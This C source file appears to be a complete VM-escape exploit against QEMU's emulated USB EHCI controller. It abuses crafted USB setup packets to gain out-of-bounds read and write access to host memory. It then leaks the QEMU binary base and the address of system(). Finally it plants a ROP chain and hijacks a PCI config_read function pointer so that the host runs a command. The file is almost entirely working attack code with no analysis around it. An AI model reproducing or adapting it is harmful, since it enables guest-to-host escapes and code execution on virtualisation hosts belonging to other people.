#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/io.h>
#include <stdio.h>  
#include <stdlib.h>  
#include <string.h>  
#include <errno.h>  
#include <sys/types.h>  
#include <sys/socket.h>  
#include <stdbool.h>
#include <netinet/in.h>  
struct EHCIqh * qh;
struct EHCIqtd * qtd;
struct ohci_td * td;
char *dmabuf;
char *setup_buf;
unsigned char *mmio_mem;
unsigned char *data_buf;
unsigned char *data_buf_oob;
uint32_t *entry;
uint64_t dev_addr;
uint64_t data_buf_addr;
uint64_t USBPort_addr; 

#define PORTSC_PRESET       (1 << 8)     // Port Reset
#define PORTSC_PED          (1 << 2)     // Port Enable/Disable
#define USBCMD_RUNSTOP      (1 << 0)
#define USBCMD_PSE          (1 << 4)
#define USB_DIR_OUT         0
#define USB_DIR_IN          0x80
#define QTD_TOKEN_ACTIVE    (1 << 7)
#define USB_TOKEN_SETUP     2
#define USB_TOKEN_IN        1 /* device -> host */
#define USB_TOKEN_OUT       0 /* host -> device */
#define QTD_TOKEN_TBYTES_SH 16
#define QTD_TOKEN_PID_SH    8

typedef struct USBDevice USBDevice;
typedef struct USBEndpoint USBEndpoint;
struct USBEndpoint {
    uint8_t nr;
    uint8_t pid;
    uint8_t type;
    uint8_t ifnum;
    int max_packet_size;
    int max_streams;
    bool pipeline;
    bool halted;
    USBDevice *dev;
    USBEndpoint *fd;
    USBEndpoint *bk;
};

struct USBDevice {
    int32_t remote_wakeup;
    int32_t setup_state;
    int32_t setup_len;
    int32_t setup_index;

    USBEndpoint ep_ctl;
    USBEndpoint ep_in[15];
    USBEndpoint ep_out[15];
};


typedef struct EHCIqh {
    uint32_t next;                    /* Standard next link pointer */

    /* endpoint characteristics */
    uint32_t epchar;

    /* endpoint capabilities */
    uint32_t epcap;

    uint32_t current_qtd;             /* Standard next link pointer */
    uint32_t next_qtd;                /* Standard next link pointer */
    uint32_t altnext_qtd;

    uint32_t token;                   /* Same as QTD token */
    uint32_t bufptr[5];               /* Standard buffer pointer */

} EHCIqh;
typedef struct EHCIqtd {
    uint32_t next;                    /* Standard next link pointer */
    uint32_t altnext;                 /* Standard next link pointer */
    uint32_t token;

    uint32_t bufptr[5];               /* Standard buffer pointer */

} EHCIqtd;

uint64_t virt2phys(void* p)
{
    uint64_t virt = (uint64_t)p;

    // Assert page alignment

    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd == -1)
        die("open");
    uint64_t offset = (virt / 0x1000) * 8;
    lseek(fd, offset, SEEK_SET);

    uint64_t phys;
    if (read(fd, &phys, 8 ) != 8)
        die("read");
    // Assert page present

    phys = (phys & ((1ULL << 54) - 1)) * 0x1000+(virt&0xfff);
    return phys;
}

void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

void mmio_write(uint32_t addr, uint32_t value)
{
    *((uint32_t*)(mmio_mem + addr)) = value;
}

uint64_t mmio_read(uint32_t addr)
{
    return *((uint64_t*)(mmio_mem + addr));
}

void init(){

    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:1d.7/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("mmio_fd open failed");

    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("mmap mmio_mem failed");

    dmabuf = mmap(0, 0x3000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (dmabuf == MAP_FAILED)
        die("mmap");

    mlock(dmabuf, 0x3000);

    entry = dmabuf + 4;
    qh = dmabuf + 0x100;
    qtd = dmabuf + 0x200;
    setup_buf = dmabuf + 0x300;
    data_buf = dmabuf + 0x1000;
    data_buf_oob = dmabuf + 0x2000;
}

void reset_enable_port(){
    mmio_write(0x64, PORTSC_PRESET);
    mmio_write(0x64, PORTSC_PED);
}

void set_EHCIState(){
    //printf("set_EHCIState~\n");
    //getchar();
    mmio_write(0x34, virt2phys(dmabuf)); // periodiclistbase
    mmio_write(0x20, USBCMD_RUNSTOP | USBCMD_PSE); // usbcmd
    sleep(1);
}

void set_qh(){
    qh->epchar = 0x00;
    qh->token = QTD_TOKEN_ACTIVE;
    qh->current_qtd = virt2phys(qtd);
}

void init_state(){
    reset_enable_port();
    set_qh();

    setup_buf[6] = 0xff;
    setup_buf[7] = 0x0;

    qtd->token = QTD_TOKEN_ACTIVE | USB_TOKEN_SETUP << QTD_TOKEN_PID_SH | 8 << QTD_TOKEN_TBYTES_SH;
    qtd->bufptr[0] = virt2phys(setup_buf);

    *entry = virt2phys(qh)+0x2;

    set_EHCIState();
}

void set_length(uint16_t len,uint8_t option){

    reset_enable_port();

    set_qh();

    setup_buf[0] = option;
    setup_buf[6] = len & 0xff;
    setup_buf[7] = (len >> 8 ) & 0xff;

    qtd->token = QTD_TOKEN_ACTIVE | USB_TOKEN_SETUP << QTD_TOKEN_PID_SH | 8 << QTD_TOKEN_TBYTES_SH;
    qtd->bufptr[0] = virt2phys(setup_buf);

    set_EHCIState();
}
void do_copy_read(){

    reset_enable_port();
    set_qh();

    qtd->token = QTD_TOKEN_ACTIVE | USB_TOKEN_IN << QTD_TOKEN_PID_SH | 0x1e00 << QTD_TOKEN_TBYTES_SH;
    qtd->bufptr[0] = virt2phys(data_buf);
    qtd->bufptr[1] = virt2phys(data_buf_oob);

    set_EHCIState();
}

void do_copy_write(int offset, unsigned int setup_len, unsigned int setup_index){

    reset_enable_port();
    set_qh();

    *(unsigned long *)(data_buf_oob + offset) = 0x0000000200000002;
    *(unsigned int *)(data_buf_oob + 0x8 +offset) = setup_len; //setup_len
    *(unsigned int *)(data_buf_oob + 0xc+ offset) = setup_index;

    qtd->token = QTD_TOKEN_ACTIVE | USB_TOKEN_OUT << QTD_TOKEN_PID_SH | 0x1e00 << QTD_TOKEN_TBYTES_SH; // flag
    qtd->bufptr[0] = virt2phys(data_buf);
    qtd->bufptr[1] = virt2phys(data_buf_oob);

    set_EHCIState();
}

void setup_state_data(){
    set_length(0x500, USB_DIR_OUT);
}

void arb_write(uint64_t target_addr, uint64_t payload)
{
    setup_state_data();

    set_length(0x1010, USB_DIR_OUT);

    unsigned long offset = target_addr - data_buf_addr;
    do_copy_write(0, offset+0x8, offset-0x1010);

    *(unsigned long *)(data_buf) = payload;
    do_copy_write(0, 0xffff, 0);

}

unsigned long arb_read(uint64_t target_addr)
{
    setup_state_data();

    set_length(0x1010, USB_DIR_OUT);

    do_copy_write(0, 0x1010, 0xfffffff8-0x1010);

    *(unsigned long *)(data_buf) = 0x2000000000000080; // set setup[0] -> USB_DIR_IN
    unsigned int target_offset = target_addr - data_buf_addr;

    do_copy_write(0x8, 0xffff, target_offset - 0x1018);
    do_copy_read(); // oob read
    return *(unsigned long *)(data_buf);
}

int main()
{

    init();

    iopl(3);
    outw(0,0xc080);
    outw(0,0xc0a0);
    outw(0,0xc0c0);
    sleep(3);

    init_state();
    set_length(0x2000, USB_DIR_IN);
    do_copy_read(); // oob read

    struct USBDevice* usb_device_tmp=dmabuf+0x2004;
    struct USBDevice usb_device;
    memcpy(&usb_device,usb_device_tmp,sizeof(USBDevice));

    dev_addr = usb_device.ep_ctl.dev;
    data_buf_addr = dev_addr + 0xdc;
    printf("USBDevice dev_addr: 0x%llx\n", dev_addr);
    printf("USBDevice->data_buf: 0x%llx\n", data_buf_addr);

    uint64_t *tmp=dmabuf+0x24f4+8;

    long long leak_addr = *tmp;
    if(leak_addr == 0){
        printf("INIT DOWN,DO IT AGAIN\n");
        return 0;
    }

    long long base = leak_addr - 0xc40d90;
    uint64_t system_plt = base + 0x290D30;

    printf("leak elf_base address : %llx!\n", base);
    printf("leak system_plt address: %llx!\n", system_plt);

    unsigned long search_start_addr = data_buf_addr + 0x5500; 
    arb_read(search_start_addr);
    char *mask = "qxl-vga\0";
    unsigned long find = memmem(data_buf, 0x1f00, mask, 0x8);
    unsigned long offset = (find&0xffffffff) - ((unsigned long)(data_buf)&0xffffffff) + 0x5500;
    unsigned long config_read_addr = data_buf_addr + offset + 0x390;
    unsigned long pci_dev = config_read_addr - 0x450;
    printf("config_read_addr: 0x%llx\n", config_read_addr);
    printf("pci_dev: 0x%llx\n", pci_dev);
    unsigned long pci_dev_content = arb_read(pci_dev);
    //unsigned long rop_start = base + 0x2c3950;
    unsigned long rop_start = base + 0x774ff0; //xchg rax, rbp; mov cl, 0xff; mov eax, dword ptr [rbp - 0x10]; leave; ret; 
    printf("pci_dev_content: 0x%llx\n", pci_dev_content);
    printf("rop_start: 0x%llx\n", rop_start);
    //unsigned long al = (((rop_start&0xff00)>>8) + (pci_dev&0xff))&0xff;

    unsigned long rsp = pci_dev + 0x8; // leave -> mov rsp, rbp; pop rbp;
    printf("new rsp: 0x%llx\n", rsp);
    unsigned long pop_rax = base + 0x523519; // pop rax; ret;
    unsigned long pop_rdi = base + 0x3b51e5; // pop rdi; ret; 
    unsigned long call_rax = base + 0x71bd09; // sub al, 0; call rax;

    arb_write(rsp, pop_rax);
    arb_write(rsp+8, system_plt);
    arb_write(rsp+0x10, pop_rdi);
    arb_write(rsp+0x18, rsp+0x30);
    arb_write(rsp+0x20, call_rax);
    arb_write(rsp+0x30, 0x636c616378);

    //getchar();

    arb_write(config_read_addr, rop_start);
    system("lspci");

};
